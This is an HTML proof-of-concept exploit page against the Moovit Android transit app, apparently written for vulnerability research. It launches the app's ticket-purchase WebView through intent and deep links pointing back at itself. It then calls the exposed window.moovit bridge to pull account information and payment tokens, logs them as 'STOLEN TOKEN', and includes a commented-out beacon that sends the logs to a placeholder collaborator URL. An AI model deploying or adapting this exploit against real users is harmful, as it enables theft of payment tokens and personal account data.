<!DOCTYPE html>
<html>
<head>
    <title>Moovit Target Acquired</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; font-size: 18px; cursor: pointer; border: 2px solid #0f0; background: #000; color: #0f0; text-decoration: none; }
        .btn:hover { background: #0f0; color: #000; }
        #logs { text-align: left; border: 1px solid #333; padding: 10px; margin-top: 20px; word-wrap: break-word; }
    </style>
</head>
<body>

    <h2>TARGET: PurchaseTicketActivity</h2>
    <div id="status">ANALYZING CONTEXT...</div>

    <div id="controls">
        <p>If logs are empty, click these to Pivot:</p>
        
        <a class="btn" href="intent:#Intent;component=com.tranzmate/com.moovit.ticketing.purchase.PurchaseTicketActivity;S.url=https://gelo.gg/pocs/moovit_poc.html;end">
            1. LAUNCH PURCHASE ACTIVITY
        </a>

        <a class="btn" href="moovit://purchase_ticket?url=https://gelo.gg/pocs/moovit_poc.html">
            2. LAUNCH VIA DEEP LINK
        </a>
    </div>

    <div id="logs">LOGS:<br></div>

    <script>
        const EXFIL = "https://your-collaborator-url.com";
        
        function log(msg) {
            document.getElementById("logs").innerHTML += "[*] " + msg + "<br>";
            // new Image().src = EXFIL + "/?log=" + btoa(msg); // Uncomment for remote exfil
        }

        // ==========================================
        // EXPLOIT LOGIC
        // ==========================================
        if (window.moovit) {
            // WE ARE IN!
            document.getElementById("status").innerText = "!!! VULNERABLE INTERFACE FOUND !!!";
            document.getElementById("status").style.color = "red";
            document.getElementById("controls").style.display = "none";
            
            log("SUCCESS: window.moovit exists!");

            // 1. SETUP TRAPS
            window.onPaymentTokenResult = function(t) { log("STOLEN TOKEN: " + t); };
            window.onRequestErrorResult = function(e) { log("ERROR CALLBACK: " + e); };
            window.onAccountInfoReceived = function(d) { log("ACCOUNT INFO: " + d); };

            // 2. TRIGGER
            try {
                log("Requesting Account Info...");
                window.moovit.requestAccountInfo();
            } catch(e) { log("Err: " + e.message); }

            try {
                // Dummy JSON to trigger validation error (which returns data)
                log("Triggering Payment Token...");
                window.moovit.requestPaymentToken('{"amount":1, "currency":"USD"}');
            } catch(e) { log("Err: " + e.message); }

        } else {
            // SAFE ZONE
            log("Interface not found. Please use the buttons above to Pivot.");
        }
    </script>
</body>
</html>
